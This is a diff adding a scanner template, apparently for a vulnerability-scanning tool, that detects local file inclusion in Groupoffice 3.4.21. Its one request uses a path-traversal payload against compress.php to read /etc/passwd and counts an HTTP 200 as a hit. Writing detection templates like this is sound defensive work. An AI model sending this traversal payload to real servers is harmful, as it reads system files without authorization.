@@ -1,0 +1,20 @@
+id: groupoffice-lfi
+brief:
+    title: Groupoffice 3.4.21 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: Groupoffice 3.4.21 is vulnerable to local file inclusion.
+    label:
+        - groupoffice
+        - lfi
+        - traversal
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/compress.php?file=../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
